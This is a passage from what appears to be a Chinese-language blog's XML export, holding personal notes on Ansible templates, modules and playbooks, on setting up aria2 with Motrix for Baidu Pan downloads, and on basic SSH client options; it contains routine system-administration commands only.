href="https://blog.csdn.net/liitdar/article/details/80889177">liitdar的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识 ansible (三)</title>
      <link href="2019/07/08/%E5%88%9D%E8%AF%86-ansible-3/"/>
      <url>2019/07/08/%E5%88%9D%E8%AF%86-ansible-3/</url>
      
        <content type="html"><![CDATA[<h3 id="模板-templates"><a href="#模板-templates" class="headerlink" title="模板 templates"></a>模板 templates</h3><p>Jinja2语言</p><p>算数运算: //(取整)</p><p>建议放在ansible目录下, 创建一个 templates 文件夹</p><p>模板文件后缀 .j2</p><p>配置文件变量用  {{ }}   括起来</p><h3 id="with-items-迭代"><a href="#with-items-迭代" class="headerlink" title="with_items 迭代"></a>with_items 迭代</h3><p>对迭代项的引用， 固定变量名为 “item”<br>要在 task 中使用 with_items 给定要迭代的元素列表<br>列表格式: 字符串 或 字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: all</span><br><span class="line">  remote_user: root</span><br><span class="line">  vars_files:</span><br><span class="line">    - vars.yml</span><br><span class="line"></span><br><span class="line">  tasks:</span><br><span class="line">    - name: unarchive</span><br><span class="line">      unarchive: src=&#123;&#123; ansibleShellRoot &#125;&#125;&#123;&#123; item &#125;&#125; dest=/tmp/ copy=yes</span><br><span class="line">      with_items:</span><br><span class="line">        - test1.tar.gz</span><br><span class="line">        - test2.tar.gz</span><br><span class="line">        - test3.tar.gz</span><br></pre></td></tr></table></figure><h3 id="playbook-gt-template-中的-for-和-if"><a href="#playbook-gt-template-中的-for-和-if" class="headerlink" title="playbook -&gt; template 中的 for 和 if"></a>playbook -&gt; template 中的 for 和 if</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># for</span><br><span class="line">&#123;% for vhost in nginx_vhosts %&#125;</span><br><span class="line">&#123;% endraw %&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen &#123;&#123; vhost.listen | default(&#39;80 default_server&#39; ) &#125;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># if</span><br><span class="line">&#123;% if vhost.server_name is defined %&#125;</span><br><span class="line">server_name &#123;</span><br><span class="line">&#123;&#123; vhost.server_name &#125;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"># if</span><br><span class="line">&#123;% if vhost.server_name is defined %&#125;</span><br><span class="line">root &#123;&#123; vhost.root &#125;&#125;;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="for-循环举例"><a href="#for-循环举例" class="headerlink" title="for 循环举例"></a>for 循环举例</h4><p>.conf.j2 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for p in ports %&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen &#123;&#123; p.port &#125;&#125;;</span><br><span class="line">servername &#123;&#123; p.name &#125;&#125;;</span><br><span class="line">root &#123;&#123; p.rootdir &#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>.yml 文件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web1:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web1.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web2:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">82</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web2.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web3:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web3.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web3</span></span><br><span class="line">        </span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">conf</span></span><br><span class="line">      <span class="attr">template:</span> <span class="string">src=/path/**.conf.j2</span> <span class="string">dest=/path/**.conf</span></span><br></pre></td></tr></table></figure><h4 id="if-判断举例"><a href="#if-判断举例" class="headerlink" title="if 判断举例"></a>if 判断举例</h4><p>.conf.j2 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for p in ports %&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen &#123;&#123; p.port &#125;&#125;;</span><br><span class="line"></span><br><span class="line">&#123;% if p.name is defined %&#125;</span><br><span class="line">servername &#123;&#123; p.name &#125;&#125;;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">root &#123;&#123; p.rootdir &#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>.yml 文件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web1:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web2:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">82</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web2.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web3:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web3</span></span><br><span class="line">        </span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">conf</span></span><br><span class="line">      <span class="attr">template:</span> <span class="string">src=/path/**.conf.j2</span> <span class="string">dest=/path/**.conf</span></span><br></pre></td></tr></table></figure><h3 id="roles-角色"><a href="#roles-角色" class="headerlink" title="roles 角色"></a>roles 角色</h3><p>roles 使得 playbook 模块化，并且在模块中的 - include roles/path 中的roles为 /etc/ansible/ 路径下的 roles. </p><p>roles 的目录树结构如下图所示 (其中的main.yml 类似于入口函数, 负责按照一定顺序调用各个模块):<br><img src="/img/ansible/tree_ansible_roles.png" class="lazyload" data-srcset="/img/ansible/tree_ansible_roles.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="tree_ansible_roles"></p><p>如果上图中的 nginx 角色要调用不同角色的文件, 需要 - include roles/角色/tasks/某某.yml</p><h4 id="角色标签"><a href="#角色标签" class="headerlink" title="角色标签"></a>角色标签</h4><p>roles:</p><ul><li>{ role: nginx, tages:[‘web’, ‘nginx’]}</li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识 ansible (二)</title>
      <link href="2019/07/08/%E5%88%9D%E8%AF%86-ansible-2/"/>
      <url>2019/07/08/%E5%88%9D%E8%AF%86-ansible-2/</url>
      
        <content type="html"><![CDATA[<h3 id="ansible-常用模块"><a href="#ansible-常用模块" class="headerlink" title="ansible 常用模块"></a>ansible 常用模块</h3><ul><li><p>Command: 在远程主机执行命令, 默认模块, 可忽略 -m 选项<br>ansible all (-m command) -a ‘service nginx restart’<br>此命令不支持 $VARNAME &lt; &gt; | ; &amp; *等, 用 shell 模块实现</p></li><li><p>Shell: </p><ul><li>-a 参数尽量放到单引号中!<br>ansible all -m shell -a ‘echo pass | passwd -stdin user’<br>调用bash执行命令 蕾西 cat /tmp/stanley.md | awk -F ‘|’ ‘print $1,$2’ &amp;&gt; /tmp/example.txt<br>这些复杂命令, 即使使用 shell 也可能会失败, 解决办法: 写到脚本时, copy到远程, 执行. 再把需要的结果拉回执行命令的机器</li></ul></li><li><p>Script: 运行脚本</p></li></ul><p>-a “/PATH/TO/SCRIPT_FILE”<br>ansible all -m script -a shel.sh</p><h3 id="ansible-vault-加密解密"><a href="#ansible-vault-加密解密" class="headerlink" title="ansible-vault 加密解密"></a>ansible-vault 加密解密</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ansible-vault encrypt file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault decrypt file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault edit file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault view file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault reykey file.yml</span><br></pre></td></tr></table></figure><h3 id="ansible-console-交互"><a href="#ansible-console-交互" class="headerlink" title="ansible-console 交互"></a>ansible-console 交互</h3><h3 id="YAML-语法"><a href="#YAML-语法" class="headerlink" title="YAML 语法"></a>YAML 语法</h3><p>在单一档案中, 可用连续三个连字号(—)区分多个档案. 另外, 还有选择性的连续三个点好(…)用来表示档案结尾<br>风格和python类似<br>一个完整代码功能需最少元素包含 name: task<br>                            module: arguments (arguments 一般是 key=value)<br>拓展名通常为 yml 或 yaml</p><p>模板:</p><pre><code>- hosts: websrvs  remote_user: root    tasks:       - name: test connection        ping:</code></pre><p>ansible目录下 vars.yml 专用于存放变量</p><h3 id="ansible-playbook"><a href="#ansible-playbook" class="headerlink" title="ansible-playbook"></a>ansible-playbook</h3><ul><li><p>运行 playbook 的方式<br>  ansible-playbook &lt;filename.yml&gt; … [options]</p><ul><li>-check 检查</li><li>–list-hosts 列出运行任务的主机</li><li>–limit 只针对主机列表中的主机执行</li><li>-v 显示过程 -vv -vvv 更详细</li></ul></li><li><p>一个模块只对应一个内容</p></li></ul><p>如下:</p><pre><code>task :  - name: copy file1    copy: src=file1 dest=/path/    copy: src=file2 dest=/path/</code></pre><p>这样只会 copy file2</p><p>顺便记下 backup 参数, backup=yes 会在复制前备份一个, 防止覆盖.<br>备份的文件名是: 文件名_随机数_时间</p><ul><li>ignore_errors</li></ul><p>即使途中出错也会继续运行: </p><pre><code>tasks:  - name: rum and ignore the result    shell: ...    ignore_errors: True</code></pre><ul><li><p>handlers 与 notify 触发事件</p><ul><li>handlers 用于当关注的资源发生变化时, 才会才会采取一定的操作</li><li>notify 调用 handler 中定义的操作</li><li>handlers 与 tasks 同级, 并且 notify 名字需要与 handlers 中的 name 名字相同</li></ul><p>  hosts: websrvs<br>  remote_user: root</p><pre><code>tasks:  - name: add group nginx    user: name=nginx state=present  - name: add user nginx    user: name=nginx state=present group=nginx   - name: install Nginx    yum: name=nginx state=present    notify:      - restart Nginx      - check Nginx processhandlers:  - name: restart Nginx    service: name=nginx state=restartd enabled=yes  - name: check Nginx process    shell: killall -0 nginx</code></pre></li><li><p>tags 标签</p></li></ul><p>可以单独只执行标签<br>多个动作可以公用一个标签</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook -t 标签 文件.yml</span><br></pre></td></tr></table></figure><ul><li><p>变量的使用</p><ul><li>ansible setup facts 远程主机的所有变量都可直接调用<br>  ansible all -m setup 查看所有系统自带变量</li><li>在 /etc/ansible/hosts 中定义<br>  普通变量: 主机组中主机单独定义, 优先级高于公共变量<br>  如: [websrvs]<pre><code>  192.168.22.33 http_port=81  192.168.22.34 http_port=82</code></pre>  公共(组)变量: 针对主机组中所有主机定义统一变量<br>  如: [websrvs:vars]<pre><code>  nodename=www  domainname=example.com</code></pre></li><li>通过命令行制定变量, 优先级最高<br>  如: ansible-playbook -e varname=value</li><li>在 playbook 中定义<br>  vars:<pre><code>\- var1:value1\- var12:value2</code></pre></li><li>在 role 中定义</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Motrix + aria2 踩坑</title>
      <link href="2019/07/08/Motrix+aria2_%E8%B8%A9%E5%9D%91/"/>
      <url>2019/07/08/Motrix+aria2_%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h4 id="案发前-被-騷亂時節的少女們-的OP-乙女どもよ-吸引想去追番的我-看着看着突然有两个域名资源加载不出来-然后想着把这两个域名加入到我的pac中-然后发现-我的pac只用链接的-…于是就跑到别人网盘上去下载pac了-就突然想起网页版网盘还能全速跑的骚操作-想安装一波…"><a href="#案发前-被-騷亂時節的少女們-的OP-乙女どもよ-吸引想去追番的我-看着看着突然有两个域名资源加载不出来-然后想着把这两个域名加入到我的pac中-然后发现-我的pac只用链接的-…于是就跑到别人网盘上去下载pac了-就突然想起网页版网盘还能全速跑的骚操作-想安装一波…" class="headerlink" title="案发前: 被　騷亂時節的少女們　的OP 乙女どもよ 吸引想去追番的我, 看着看着突然有两个域名资源加载不出来, 然后想着把这两个域名加入到我的pac中, 然后发现, 我的pac只用链接的,…于是就跑到别人网盘上去下载pac了. 就突然想起网页版网盘还能全速跑的骚操作, 想安装一波…"></a>案发前: 被　騷亂時節的少女們　的OP 乙女どもよ 吸引想去追番的我, 看着看着突然有两个域名资源加载不出来, 然后想着把这两个域名加入到我的pac中, 然后发现, 我的pac只用链接的,…于是就跑到别人网盘上去下载pac了. 就突然想起网页版网盘还能全速跑的骚操作, 想安装一波…</h4><p>然后就完全忘了看番这件事了…..</p><h3 id="Motrix-1-4-1-aria2-1-34-0"><a href="#Motrix-1-4-1-aria2-1-34-0" class="headerlink" title="Motrix(1.4.1) + aria2(1.34.0)"></a>Motrix(1.4.1) + aria2(1.34.0)</h3><p>突然觉得百度云盘直接用web端会方便很多,于是想尝试着去使用 <a href="https://github.com/agalwood/Motrix">Motrix</a> + <a href="https://github.com/aria2/aria2">aria2</a> + <a href="https://github.com/acgotaku/BaiduExporter">BaiduExporter</a> 的组合, 然后就掉坑了….</p><h3 id="Motrix-官网下载就好啦"><a href="#Motrix-官网下载就好啦" class="headerlink" title="Motrix 官网下载就好啦!"></a>Motrix 官网下载就好啦!</h3><h3 id="编译安装最新版本滴-aria2"><a href="#编译安装最新版本滴-aria2" class="headerlink" title="编译安装最新版本滴 aria2"></a>编译安装最新版本滴 <a href="https://github.com/aria2/aria2/releases">aria2</a></h3><p>解压进入目录编译安装一条龙…(<strong>记得切换位root用户,不然安装时有可能提示权限不够</strong>)<br>预编译也不需要加其他拓展,默认就OK啦!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">tar &amp;&amp; <span class="built_in">cd</span>  &amp;&amp; ./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>继续保持root用户, 方便操作<br>配置文件目录任意, 但要保持下面的path都在同一path .session 文件一定要有喔!<br>aria2.conf 的配置可以参考下<a href="https://github.com/TARI0510/Ubuntu/blob/master/arias.conf">我滴</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /path/aria2 &amp;&amp; touch /path/aria2.session &amp;&amp; chmod 777 /path/aria2.session</span><br><span class="line">vim /path/aria2.conf</span><br></pre></td></tr></table></figure><h3 id="配置完成就可以使用啦-才怪"><a href="#配置完成就可以使用啦-才怪" class="headerlink" title="配置完成就可以使用啦!(才怪)"></a>配置完成就可以使用啦!(才怪)</h3><p>要么你是root用户, 不然启动 aria2c 一定记得加 <strong>sudo</strong>!! 我就被坑了…emmm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo aria2c --conf-path=/path/aria2/aria2.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是在后台运行, 还没下载成功之前建议用上面的, 方便查看运行结果</span></span><br><span class="line">sudo aria2c --conf-path=/path/aria2/aria2.conf -D</span><br></pre></td></tr></table></figure><h3 id="安装-BaiduExporter-我使用的是0-8-5"><a href="#安装-BaiduExporter-我使用的是0-8-5" class="headerlink" title="安装 BaiduExporter(我使用的是0.8.5)"></a>安装 <a href="https://github.com/acgotaku/BaiduExporter">BaiduExporter</a>(我使用的是0.8.5)</h3><p>记得安装最新版本, 我就因为没安装最新版本, 他原本对 pan.baidu.com 之类的域名是没有授权, 导致aria2访问不到, 哭死…仔细看README.MD的重要性….</p><p>随便找个可以下载百度云的链接打开, 看到 <strong>MO.app</strong> 在 保存到网盘 下载等按钮附件就知道插件安装成功啦!!(记得在chrome拓展看看有没有报错, 报错要重装喔!)</p><p>说说 MO.app 里面 <strong>设置</strong> 里面主要字段的含义吧!</p><h4 id="RPC地址"><a href="#RPC地址" class="headerlink" title="RPC地址"></a>RPC地址</h4><p>使用MO下载: 就是下载按钮的名字啦!<br>后面跟着的内容在README.ME有说, 我的是<a href="http://token/">http://token</a>:(在motrix Preference-&gt;Advanced-&gt;Security-&gt;RPCSecret 里面的内容)@localhost:16800/jsonrpc </p><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>在 Motrix Preference-&gt;Advanced-&gt;Security: Mock User-Agent 选择 <strong>du</strong></p><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>保持默认的 <a href="https://pan.baidu.com/disk/home">https://pan.baidu.com/disk/home</a> 就好啦!</p><h4 id="Motrix-的配置更改后记得点-Save-amp-Apply-就好啦"><a href="#Motrix-的配置更改后记得点-Save-amp-Apply-就好啦" class="headerlink" title="Motrix 的配置更改后记得点 Save &amp; Apply 就好啦!"></a>Motrix 的配置更改后记得点 Save &amp; Apply 就好啦!</h4><h3 id="我踩滴坑"><a href="#我踩滴坑" class="headerlink" title="我踩滴坑"></a>我踩滴坑</h3><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">07/07 22:22:06 [ERROR] Failed to serialize session to <span class="string">&#x27;/etc/aria2/aria2.session&#x27;</span>.</span><br></pre></td></tr></table></figure><p>这个主要是因为我没有用 sudo 运行 aria2c</p><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">07/07 23:46:37 [ERROR] CUID<span class="comment">#10 - Download aborted. URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4</span></span><br><span class="line">Exception: [AbstractCommand.cc:351] errorCode=22 URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4</span><br><span class="line">  -&gt; [HttpSkipResponseCommand.cc:240] errorCode=22 </span><br><span class="line">  The response status is not successful. status=403</span><br><span class="line"></span><br><span class="line">07/07 23:46:37 [NOTICE] Download GID<span class="comment">#2384700d4e908591 not complete: /home/tari/Downloads/回顾视频.mp4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个主要是因为我插件关于百度云盘的域名授权问题, 保持好插件最新版本就好啦!</p>]]></content>
      
      
      <categories>
          
          <category> 日常折腾 </category>
          
          <category> Motrix </category>
          
          <category> aria2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常折腾 </tag>
            
            <tag> Motrix </tag>
            
            <tag> aria2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about ssh</title>
      <link href="2019/07/06/ssh/"/>
      <url>2019/07/06/ssh/</url>
      
        <content type="html"><![CDATA[<h3 id="etc-hosts-deny-禁用无效"><a href="#etc-hosts-deny-禁用无效" class="headerlink" title="/etc/hosts.deny 禁用无效"></a>/etc/hosts.deny 禁用无效</h3><p>原因：编译安装时默认没有加载libwrap库</p><p>[转载自 <a href="https://mp.weixin.qq.com/s?__biz=MzU3NTgyODQ1Nw==&mid=2247485564&idx=2&sn=38620597bda9f3dfdd7208c4f94d7ff2&chksm=fd1c70faca6bf9ec7fab69f1fdd5453f63bd7040940b33b1a730c1d12a42675424b70f906e69&mpshare=1&scene=1&srcid=&key=87f46a9190202d8fe4b26708a8287afdd783bcdb437852de4172f55513c3c4bbd3a4364ee67068e983d84c07bb884d0298b24e15cb905ce6fa82db7ec104b33886b6e02e2e359a596cdec79929c1174e&ascene=1&uin=MjMxMTMxNDIxMw==&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=Ks6ARNaAyjOn+MDn0BlfGaZi3QgnAKBugECR9dT+pk7bVXvF/R+0jnIDyFwuIf9P">良许Linux</a>]</p><h4 id="Secure-Shell缩写是SSH，-由IETF的网络工作小组（Network-Working-Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。"><a href="#Secure-Shell缩写是SSH，-由IETF的网络工作小组（Network-Working-Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。" class="headerlink" title="Secure Shell缩写是SSH， 由IETF的网络工作小组（Network Working Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。"></a>Secure Shell缩写是SSH， 由IETF的网络工作小组（Network Working Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。</h4><p>下面我们来介绍 SSH 的 7 大用法。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>最简单的用法就是不带参数，仅输入 ssh 再加上主机地址，比如：</p><p>ssh 192.168.0.116<br>这种形式登陆主机，会默认使用当前用户进行登录。第一次连接的时候，SSH 会确认目标主机的真实性，如果没有问题的话，输入 yes 即可。</p><p>如果我们想要以指定用户名来登录主机，有两种方法：</p><p>a. 使用 -l 选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -l alvin 192.168.0.116</span><br></pre></td></tr></table></figure><p>b. 使用 user@hostname 格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh alvin@192.168.0.116</span><br></pre></td></tr></table></figure><p>这两种方法，其中第二种尤为常用。</p><h3 id="指定端口登录"><a href="#指定端口登录" class="headerlink" title="指定端口登录"></a>指定端口登录</h3><p>SSH 默认使用的端口号是 22。大多现代的 Linux 系统 22 端口都是开放的。如果你运行 ssh 程序而没有指定端口号，它直接就是通过 22 端口发送请求的。</p><p>如果我们不想通过 22 端口登录，那么我们可以使用 -p 选项来指定端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.0.116 -p 1234</span><br></pre></td></tr></table></figure><p>引申话题：如何修改端口号？<br>只需修改 /etc/ssh/ssh_config ，修改如下一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 22</span><br></pre></td></tr></table></figure><h3 id="对所有数据请求压缩"><a href="#对所有数据请求压缩" class="headerlink" title="对所有数据请求压缩"></a>对所有数据请求压缩</h3><p>使用 -C 选项，所有通过 SSH 发送或接收的数据将会被压缩，并且任然是加密的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -C 192.168.0.116</span><br></pre></td></tr></table></figure><p>但是，这个选项在网速不是很快的时候比较有用，而当网速较快的时候，使用压缩反而会降低效率，所以要视情况使用。</p><h3 id="打开调试模式"><a href="#打开调试模式" class="headerlink" title="打开调试模式"></a>打开调试模式</h3><p>因为某些原因，我们想要追踪调试我们建立的 SSH 连接情况。SSH 提供的 -v 选项参数正是为此而设的。其可以看到在哪个环节出了问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Alvin.Alvin-computer] ➤ ssh -v pi@192.168.0.116</span><br><span class="line">OpenSSH_7.1p2, OpenSSL 1.0.1g 7 Apr 2014</span><br><span class="line">debug1: Reading configuration data /etc/ssh_config</span><br><span class="line">debug1: Connecting to 192.168.0.116 [192.168.0.116] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: Enabling compatibility mode <span class="keyword">for</span> protocol 2.0</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_7.1</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.4p1 Raspbian-10+deb9u4</span><br><span class="line">debug1: match: OpenSSH_7.4p1 Raspbian-10+deb9u4 pat OpenSSH* compat 0x04000000</span><br><span class="line">debug1: Authenticating to 192.168.0.116:22 as <span class="string">&#x27;pi&#x27;</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br></pre></td></tr></table></figure><h3 id="绑定源地址"><a href="#绑定源地址" class="headerlink" title="绑定源地址"></a>绑定源地址</h3><p>如果你的客户端有多于两个以上的 IP 地址，你就不可能分得清楚在使用哪一个 IP 连接到 SSH 